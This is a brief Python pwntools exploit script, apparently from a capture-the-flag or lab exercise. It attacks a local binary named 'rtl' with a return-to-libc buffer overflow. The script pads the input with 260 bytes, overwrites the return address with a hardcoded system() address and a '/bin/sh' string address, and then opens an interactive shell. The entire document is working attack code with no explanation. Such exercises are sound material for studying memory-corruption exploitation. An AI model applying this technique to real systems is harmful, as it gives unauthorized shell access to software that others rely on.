from pwn import *

p = process("./rtl")

system_addr = 0xf7dcd430
binsh_addr = 0xf7f41de8

payload = b"A"*256 + b"B"*4 + p32(system_addr) + b"C"*4 + p32(binsh_addr)

p.sendline(payload)

p.interactive()

